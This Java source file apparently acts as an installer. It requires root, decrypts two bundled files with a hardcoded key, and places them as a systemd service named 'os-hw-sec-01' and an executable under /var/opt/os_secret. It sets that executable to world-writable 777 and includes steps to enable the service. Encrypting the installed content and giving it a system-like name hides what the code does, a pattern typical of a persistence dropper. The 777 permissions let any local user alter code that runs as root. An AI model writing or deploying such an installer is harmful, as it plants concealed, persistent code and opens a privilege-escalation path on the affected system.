import java.io.IOException;

public class Main {
    private static final String SECRET_KEY = "2B7E151628AED2A6ABF7158809CF4F3C";

    public static void main(String[] args) {
//        CreateEnc();
        Setup();
    }
    private static void CreateEnc(){
        try {
            Crypto.encryptFile("os-hw-sec-01.service", "srv.enc", SECRET_KEY);
            Crypto.encryptFile("runner", "scr.enc", SECRET_KEY);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    private static void Setup(){
        RootChecker.ensureRootUser();
        SetupEnc();
//        StartService();
    }

    private static void SetupEnc(){
        try {
            Crypto.decryptFile("srv.enc", "/etc/systemd/system/os-hw-sec-01.service", SECRET_KEY);
            Crypto.decryptFile("scr.enc", "/var/opt/os_secret/runner", SECRET_KEY);
            Process processReload = Runtime.getRuntime().exec("sudo chmod 777 /var/opt/os_secret/runner");
            processReload.waitFor();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static void StartService(){
        try {
            Process processReload = Runtime.getRuntime().exec("sudo systemctl daemon-reload");
            processReload.waitFor();
            Process processEnable = Runtime.getRuntime().exec("sudo systemctl enable os-hw-sec-01.service");
            processEnable.waitFor();
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
